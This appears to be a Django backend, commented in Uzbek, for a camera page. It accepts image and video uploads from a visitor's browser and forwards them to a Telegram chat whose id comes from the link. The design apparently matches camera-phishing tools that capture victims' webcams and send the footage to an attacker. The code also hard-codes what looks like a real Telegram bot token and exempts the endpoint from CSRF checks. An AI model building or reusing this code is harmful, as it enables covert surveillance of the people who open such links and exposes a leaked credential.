import os
import uuid
import requests
import subprocess
from django.conf import settings
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.core.files.base import ContentFile
from django.core.files.storage import default_storage
from django.shortcuts import render

# Telegram bot token (ilovangizda environment orqali saqlash tavsiya etiladi)
TELEGRAM_BOT_TOKEN = "8444297437:AAHDEuv1a0BvLHeDAzUJHGAxQGRsCsuIoI0"

# Media papkalar
IMAGE_DIR = os.path.join(settings.MEDIA_ROOT, 'saved_images')
VIDEO_DIR = os.path.join(settings.MEDIA_ROOT, 'saved_videos')
os.makedirs(IMAGE_DIR, exist_ok=True)
os.makedirs(VIDEO_DIR, exist_ok=True)


@csrf_exempt
def camera_view(request, id):
    """
    Bitta view:
      - GET  -> camera/index.html sahifasini render qiladi
      - POST -> 'image' yoki 'video' faylini qabul qilib saqlaydi va Telegramga yuboradi.
    'id' parametri URL orqali olinadi va Telegram chat_id sifatida ishlatiladi.
    """
    # GET -> sahifani ko'rsatish
    if request.method == "GET":
        return render(request, "camera/index.html", {
            'MEDIA_URL': settings.MEDIA_URL
        })

    # Agar rasm yuborilgan bo'lsa
    if 'image' in request.FILES:
        uploaded_file = request.FILES['image']
        ext = uploaded_file.name.split('.')[-1]
        filename = f"{id}_{uuid.uuid4()}.{ext}"
        file_path = os.path.join(IMAGE_DIR, filename)

        # Saqlash (default_storage bilan yoki bevosita yozish mumkin)
        default_storage.save(file_path, ContentFile(uploaded_file.read()))

        # Telegramga yuborish (sendPhoto)
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
            with open(file_path, "rb") as f:
                files = {"photo": f}
                data = {"chat_id": id, "caption": f"Snapshot from {id}"}
                r = requests.post(url, files=files, data=data, timeout=15)
                # agar kerak bo'lsa r.status_code va r.json() bilan tekshirib yozing
        except Exception as e:
            print("Telegram rasm yuborishda xato:", e)

        return JsonResponse({"status": "success", "type": "image", "filename": filename})

    # Agar video yuborilgan bo'lsa
    if 'video' in request.FILES:
        uploaded_file = request.FILES['video']
        webm_filename = f"{id}_{uuid.uuid4()}.webm"
        webm_path = os.path.join(VIDEO_DIR, webm_filename)
        default_storage.save(webm_path, ContentFile(uploaded_file.read()))

        # MP4 ga aylantirish
        mp4_filename = f"{id}_{uuid.uuid4()}.mp4"
        mp4_path = os.path.join(VIDEO_DIR, mp4_filename)

        try:
            subprocess.run([
                "ffmpeg", "-i", webm_path,
                "-c:v", "libx264", "-preset", "fast",
                "-c:a", "aac", "-b:a", "128k",
                "-y", mp4_path
            ], check=True)

            # Telegramga yuborish (sendVideo)
            try:
                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
                with open(mp4_path, "rb") as f:
                    files = {"video": f}
                    data = {"chat_id": id, "caption": f"Video from {id}"}
                    r = requests.post(url, files=files, data=data, timeout=60)
            except Exception as e:
                print("Telegram video yuborishda xato:", e)

        except Exception as e:
            print("FFmpeg konvertatsiya xato:", e)
            return JsonResponse({"status": "error", "message": "Video konvertatsiya xato"})

        return JsonResponse({"status": "success", "type": "video", "filename": mp4_filename})

    # Hech qanday fayl bo'lmasa
    return JsonResponse({"status": "error", "message": "Hech qanday fayl yuborilmadi"})
